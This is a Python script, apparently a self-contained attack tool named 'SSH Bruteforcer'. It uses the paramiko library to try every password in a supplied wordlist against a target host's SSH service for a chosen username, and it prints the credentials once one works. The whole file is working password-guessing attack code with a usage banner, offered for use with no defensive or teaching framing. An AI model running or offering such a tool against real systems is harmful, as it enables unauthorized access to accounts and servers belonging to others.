# Libraries
import paramiko
import sys
import subprocess

count = 1


def usage():
    print("SSH Bruteforcer")
    print("Usage:")
    print()
    print("sudo python3 ssh_bruteforce.py -t 10.0.2.5 -f <password file list> -u <username>")




def connectSSH(hostname, port, username, passFile):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(passFile, "r") as f:
        global count
        for password in f.readlines():
            password = password.strip()
            try:
                client.connect(hostname, port=port, username=username, password=password)
                print("[" + str(count) + "] " + "[+] Password Success ~ " + password)
                print("*" * 50)
                print("HostName: " + hostname)
                print("Credentials: " + username + ":" + password)

                print("*" * 50)
                break
            except:
                print("[" + str(count) + "] " + "[-] Password Failed ~ " + password)
                count += 1

if(sys.argv[1] == "-h"):
    usage()
    exit()


if(sys.argv[1] == "-t"):
   
    hostname = sys.argv[sys.argv.index("-t")+1]

if(sys.argv[3] == "-f"):
    passwordFile = sys.argv[sys.argv.index("-f")+1]

uswitch = "-u"
if (sys.argv[5] == "-u"):
    username = sys.argv[sys.argv.index("-u")+1]

connectSSH(hostname, 22, username, passwordFile)